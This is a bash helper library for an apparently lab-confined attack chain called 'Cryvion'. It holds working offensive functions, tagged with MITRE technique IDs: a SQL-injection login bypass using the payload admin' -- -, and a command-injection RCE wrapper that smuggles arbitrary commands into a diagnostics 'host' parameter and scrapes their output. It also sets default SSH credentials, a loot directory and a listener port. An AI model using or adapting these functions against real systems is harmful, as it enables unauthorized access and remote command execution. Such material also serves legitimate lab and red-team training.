#!/bin/bash
# Shared helpers for the Cryvion attack chain.
# All offence is confined to the lab's Docker networks.

TARGET_HOST="${TARGET_HOST:-web-app}"
TARGET="${TARGET_HOST}:8080"
INTERNAL_HOST="${INTERNAL_HOST:-internal-svc}"
COOKIE="${COOKIE:-/tmp/cryvion.cookie}"
LOOT="${LOOT:-/loot}"
ATTACKER_LISTEN_PORT="${ATTACKER_LISTEN_PORT:-9001}"

# discovered during the attack (cred access stage writes these)
SSH_USER="${SSH_USER:-svc-backup}"
SSH_PASS="${SSH_PASS:-Password1}"

C_CYAN='\033[36m'; C_GRN='\033[32m'; C_YEL='\033[33m'; C_RED='\033[31m'; C_RST='\033[0m'

banner() { echo -e "\n${C_CYAN}========================================================${C_RST}";
           echo -e "${C_CYAN}>> $*${C_RST}";
           echo -e "${C_CYAN}========================================================${C_RST}"; }
log()  { echo -e "${C_YEL}[*]${C_RST} $*"; }
ok()   { echo -e "${C_GRN}[+]${C_RST} $*"; }
err()  { echo -e "${C_RED}[-]${C_RST} $*"; }

mkdir -p "$LOOT" 2>/dev/null || true

# Establish an authenticated session via SQL-injection auth bypass (T1190).
# Saves the session cookie to $COOKIE.
sqli_login() {
  curl -s -c "$COOKIE" -b "$COOKIE" -L \
    --data-urlencode "username=admin' -- -" \
    --data-urlencode "password=anything" \
    "http://$TARGET/login" | grep -q "Customer Records"
}

# Run a command inside the web container via the command-injection RCE (T1059).
# ping is silenced so only the command's stdout is returned.
rce() {
  curl -s -G -b "$COOKIE" "http://$TARGET/admin/diagnostics" \
    --data-urlencode "host=localhost >/dev/null 2>&1; $1" \
    | grep -ozP '(?s)<pre class=box>\K.*?(?=</pre>)' | tr -d '\0'
}
